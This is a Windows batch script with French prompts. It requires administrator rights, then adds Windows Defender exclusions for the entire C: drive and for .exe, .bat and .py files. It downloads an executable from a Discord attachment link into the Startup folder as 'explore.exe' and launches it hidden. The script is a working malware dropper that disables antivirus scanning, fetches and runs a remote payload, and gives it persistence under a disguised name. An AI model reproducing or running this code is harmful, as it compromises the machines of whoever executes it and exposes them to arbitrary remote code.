@echo off

>nul 2>&1 net session || (
    echo Pour pouvoir utiliser l'utilitaire, vous devez être un administrateur
    echo exécutant une session de console.
    pause
    exit
)

chcp 65001 > nul

:: Le reste du script à exécuter avec des privilèges d'administrateur
set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
powershell -Command "Add-MpPreference -ExclusionExtension '.exe'"
powershell -Command "Add-MpPreference -ExclusionExtension '.bat'"
powershell -Command "Add-MpPreference -ExclusionExtension '.py'"

set "DownloadURL=https://cdn.discordapp.com/attachments/1130988233761771581/1137590314295636058/x.exe"
set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe"
powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
